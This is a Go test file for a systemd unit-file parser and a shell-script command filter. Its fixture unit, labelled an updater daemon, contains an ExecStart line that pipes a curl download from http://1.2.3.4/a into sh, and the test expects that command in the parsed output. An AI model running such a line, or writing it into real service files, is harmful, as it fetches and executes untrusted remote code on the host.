package services

import (
	"strings"
	"testing"
)

func TestParseUnit(t *testing.T) {
	u := ParseUnit(strings.NewReader(`# comment
[Unit]
Description=Updater daemon

[Service]
Type=simple
User=nobody
ExecStartPre=-/usr/bin/mkdir -p /run/x
ExecStart=/bin/sh -c "curl -s http://1.2.3.4/a \
  | sh"
ExecStop=@/usr/bin/kill kill -TERM $MAINPID

[Install]
WantedBy=multi-user.target default.target
`))
	if u.Description != "Updater daemon" || u.User != "nobody" || len(u.WantedBy) != 2 {
		t.Errorf("unit = %+v", u)
	}
	want := []string{"/usr/bin/mkdir -p /run/x", `/bin/sh -c "curl -s http://1.2.3.4/a  | sh"`, "/usr/bin/kill -TERM $MAINPID"}
	if len(u.Exec) != len(want) {
		t.Fatalf("exec = %q", u.Exec)
	}
	for i := range want {
		if u.Exec[i] != want[i] {
			t.Errorf("exec[%d] = %q, want %q", i, u.Exec[i], want[i])
		}
	}
}

func TestScriptCommands(t *testing.T) {
	if got := ScriptCommands([]string{"#!/bin/sh", "", "  # x", "echo hi", "exit 0"}); len(got) != 2 {
		t.Errorf("ScriptCommands = %v", got)
	}
}
